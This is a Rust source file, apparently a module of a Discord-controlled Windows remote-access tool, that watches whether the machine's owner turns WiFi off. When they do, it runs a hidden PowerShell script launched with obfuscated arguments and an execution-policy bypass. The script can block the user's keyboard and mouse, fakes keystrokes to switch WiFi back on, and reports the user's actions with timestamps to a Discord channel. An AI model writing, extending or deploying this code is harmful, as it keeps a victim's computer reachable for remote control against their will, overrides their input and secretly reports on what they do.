use anyhow::Result;
use std::sync::Arc;
use std::os::windows::process::CommandExt;
use twilight_http::Client as HttpClient;
use twilight_model::id::Id;
use twilight_model::id::marker::ChannelMarker;
use chrono::{DateTime, Utc};
use std::collections::VecDeque;
use tokio::sync::Mutex;
use crate::config::WifiMonitorConfig;

// @note: Using tokio::process::Command directly in async functions to avoid blocking

pub struct WifiMonitor {
    http: Arc<HttpClient>,
    channel_id: Id<ChannelMarker>,
    config: WifiMonitorConfig,
}

#[derive(Debug, Clone, PartialEq)]
enum WifiState {
    Enabled,
    Disabled,
    NotFound,
}

#[derive(Debug, Clone)]
struct WifiEvent {
    message: String,
    timestamp: DateTime<Utc>,
}

impl WifiMonitor {
    pub fn new(http: Arc<HttpClient>, channel_id: Id<ChannelMarker>, config: WifiMonitorConfig) -> Self {
        Self { http, channel_id, config }
    }

    pub async fn start_monitoring(&self) -> Result<()> {
        if !self.config.enabled {
            return Ok(()); // WiFi monitoring is disabled in config
        }

        let http = self.http.clone();
        let channel_id = self.channel_id;
        let check_interval_ms = self.config.check_interval_ms;
        let re_enable_delay_seconds = self.config.re_enable_delay_seconds;
        let block_user_input = self.config.block_user_input;

        tokio::spawn(async move {
            let event_queue: Arc<Mutex<VecDeque<WifiEvent>>> = Arc::new(Mutex::new(VecDeque::new()));
            let mut last_state = Self::get_wifi_state().await;

            if last_state == WifiState::Enabled {
                let _ = http
                    .create_message(channel_id)
                    .content("**WiFi Monitor**: WiFi is currently enabled")
                    .await;
            }

            loop {
                tokio::time::sleep(tokio::time::Duration::from_millis(check_interval_ms)).await;
                let current_state = Self::get_wifi_state().await;

                if current_state != last_state {
                    let status_msg = match (&last_state, &current_state) {
                        (WifiState::Enabled, WifiState::Disabled) => {
                            // WiFi = off
                            let re_enable_msg = Self::re_enable_wifi(re_enable_delay_seconds, block_user_input).await;
                            Some(format!("**Wifi disabled**: User turned off the wifi\n{}", re_enable_msg))
                        },
                        (WifiState::Disabled, WifiState::Enabled) => {
                            Some("**Wifi enabled**: User is now back to online".to_string())
                        },
                        (_, WifiState::NotFound) => {
                            Some("**Wifi adapter not found**: Couldnt find wifi adapter".to_string())
                        },
                        (WifiState::NotFound, WifiState::Enabled) => {
                            Some("**Wifi is now enabled**".to_string())
                        },
                        _ => None,
                    };

                    if let Some(msg) = status_msg {
                        let event = WifiEvent { // store event in queue
                            message: msg,
                            timestamp: Utc::now(),
                        };
                        event_queue.lock().await.push_back(event);
                    }

                    last_state = current_state.clone();
                }

                if current_state == WifiState::Enabled {
                    Self::flush_event_queue(&http, channel_id, &event_queue).await;
                }
            }
        });

        Ok(())
    }

    async fn flush_event_queue(
        http: &Arc<HttpClient>,
        channel_id: Id<ChannelMarker>,
        event_queue: &Arc<Mutex<VecDeque<WifiEvent>>>,
    ) {
        let mut queue = event_queue.lock().await;

        while let Some(event) = queue.pop_front() {
            // check for internet
            if !Self::check_internet_connection().await {
                // no wifi, put event back and stop
                queue.push_front(event);
                break;
            }

            let formatted_msg = format!(
                "{}\n**User turned off at**: {}",
                event.message,
                event.timestamp.format("%Y-%m-%d %H:%M:%S UTC")
            );

            match http.create_message(channel_id).content(&formatted_msg).await {
                Ok(_) => {
                    // continue
                }
                Err(_) => {
                    queue.push_front(event);
                    break;
                }
            }
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }

    async fn check_internet_connection() -> bool {
        if let Ok(output) = tokio::process::Command::new("ping")
            .args(&["-n", "1", "-w", "1000", "8.8.8.8"])
            .creation_flags(0x08000000)
            .output()
            .await
        {
            return output.status.success();
        }
        false
    }

    async fn re_enable_wifi(delay_seconds: u64, block_input: bool) -> String {
        tokio::time::sleep(tokio::time::Duration::from_secs(delay_seconds)).await;

        let powershell_script = if block_input {
            r#"
            Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                public class InputBlocker {
                    [DllImport("user32.dll")]
                    public static extern bool BlockInput(bool fBlockIt);

                    [DllImport("user32.dll")]
                    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

                    [DllImport("user32.dll")]
                    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

                    [DllImport("user32.dll")]
                    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

                    [DllImport("user32.dll")]
                    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

                    [DllImport("kernel32.dll")]
                    public static extern IntPtr GetModuleHandle(string lpModuleName);

                    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

                    public const int VK_LWIN = 0x5B;
                    public const int VK_A = 0x41;
                    public const int VK_RETURN = 0x0D;
                    public const int VK_ESCAPE = 0x1B;
                    public const uint KEYEVENTF_KEYUP = 0x0002;
                    public const int WH_KEYBOARD_LL = 13;
                }
"@

            try {
                [InputBlocker]::BlockInput($true)
                Start-Sleep -Milliseconds 200

                [InputBlocker]::keybd_event([InputBlocker]::VK_LWIN, 0, 0, [UIntPtr]::Zero)
                [InputBlocker]::keybd_event([InputBlocker]::VK_A, 0, 0, [UIntPtr]::Zero)
                Start-Sleep -Milliseconds 50
                [InputBlocker]::keybd_event([InputBlocker]::VK_A, 0, [InputBlocker]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                [InputBlocker]::keybd_event([InputBlocker]::VK_LWIN, 0, [InputBlocker]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                Start-Sleep -Milliseconds 800

                [InputBlocker]::keybd_event([InputBlocker]::VK_RETURN, 0, 0, [UIntPtr]::Zero)
                Start-Sleep -Milliseconds 50
                [InputBlocker]::keybd_event([InputBlocker]::VK_RETURN, 0, [InputBlocker]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                Start-Sleep -Milliseconds 300

                [InputBlocker]::keybd_event([InputBlocker]::VK_ESCAPE, 0, 0, [UIntPtr]::Zero)
                Start-Sleep -Milliseconds 50
                [InputBlocker]::keybd_event([InputBlocker]::VK_ESCAPE, 0, [InputBlocker]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                Start-Sleep -Milliseconds 200

            } finally {
                [InputBlocker]::BlockInput($false)
            }

            Write-Output "Auto-reconnect sequence completed"
        "#
        } else {
            r#"
            Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                public class KeyPresser {
                    [DllImport("user32.dll")]
                    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

                    public const int VK_LWIN = 0x5B;
                    public const int VK_A = 0x41;
                    public const int VK_RETURN = 0x0D;
                    public const int VK_ESCAPE = 0x1B;
                    public const uint KEYEVENTF_KEYUP = 0x0002;
                }
"@

            [KeyPresser]::keybd_event([KeyPresser]::VK_LWIN, 0, 0, [UIntPtr]::Zero)
            [KeyPresser]::keybd_event([KeyPresser]::VK_A, 0, 0, [UIntPtr]::Zero)
            Start-Sleep -Milliseconds 50
            [KeyPresser]::keybd_event([KeyPresser]::VK_A, 0, [KeyPresser]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
            [KeyPresser]::keybd_event([KeyPresser]::VK_LWIN, 0, [KeyPresser]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
            Start-Sleep -Milliseconds 800

            [KeyPresser]::keybd_event([KeyPresser]::VK_RETURN, 0, 0, [UIntPtr]::Zero)
            Start-Sleep -Milliseconds 50
            [KeyPresser]::keybd_event([KeyPresser]::VK_RETURN, 0, [KeyPresser]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
            Start-Sleep -Milliseconds 300

            [KeyPresser]::keybd_event([KeyPresser]::VK_ESCAPE, 0, 0, [UIntPtr]::Zero)
            Start-Sleep -Milliseconds 50
            [KeyPresser]::keybd_event([KeyPresser]::VK_ESCAPE, 0, [KeyPresser]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
        "#
        };

        use crate::utils::obfuscate::{exe, powershell as ps};
        
        match tokio::process::Command::new(exe::powershell())
            .args(&[
                &ps::no_profile(),
                &ps::non_interactive(),
                &ps::execution_policy(), &ps::bypass(),
                &ps::command(),
                powershell_script
            ])
            .creation_flags(0x08000000)
            .output()
            .await
        {
            Ok(_output) => {
                return format!("**Auto reconnect successfully~!**");
            }
            Err(e) => {
                return format!("**Auto reconnect failed** - {}", e);
            }
        }
    }


    async fn get_wifi_state() -> WifiState {
        // Use tokio async command instead of blocking std::process::Command
        if let Ok(output) = tokio::process::Command::new("netsh")
            .args(&["wlan", "show", "interfaces"])
            .creation_flags(0x08000000)
            .output()
            .await
        {
            let output_str = String::from_utf8_lossy(&output.stdout);
            if output_str.to_lowercase().contains("there is") && output_str.to_lowercase().contains("interface") {
                let mut found_radio_status = false;
                for line in output_str.lines() {
                    let line_trimmed = line.trim();

                    if line_trimmed.starts_with("Radio status") {
                        found_radio_status = true;
                    } else if found_radio_status && line_trimmed.starts_with("Software") {
                        if line_trimmed.to_lowercase().contains("software off") || line_trimmed.to_lowercase().contains("software    off") {
                            return WifiState::Disabled;
                        } else if line_trimmed.to_lowercase().contains("software on") {
                            return WifiState::Enabled;
                        }
                        found_radio_status = false;
                    }
                }

                if output_str.to_lowercase().contains("state") {
                    for line in output_str.lines() {
                        let line_trimmed = line.trim();
                        if line_trimmed.to_lowercase().starts_with("state") {
                            if line_trimmed.to_lowercase().contains("disconnected") || line_trimmed.to_lowercase().contains("connected") {
                                return WifiState::Enabled;
                            }
                        }
                    }
                }
            }
        }

        // Use tokio async command here too
        if let Ok(output) = tokio::process::Command::new("netsh")
            .args(&["interface", "show", "interface"])
            .creation_flags(0x08000000)
            .output()
            .await
        {
            let output_str = String::from_utf8_lossy(&output.stdout);

            for line in output_str.lines() {
                let line_lower = line.to_lowercase();

                if (line_lower.contains("wi-fi") || line_lower.contains("wlan") || line_lower.contains("wireless"))
                    && !line_lower.contains("bluetooth")
                    && !line_lower.contains("virtual")
                {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 4 {
                        let admin_state = parts[0].to_lowercase();
                        if admin_state == "disabled" {
                            return WifiState::Disabled;
                        } else if admin_state == "enabled" {
                            return WifiState::Enabled;
                        }
                    }
                }
            }
        }

        WifiState::NotFound
    }
}
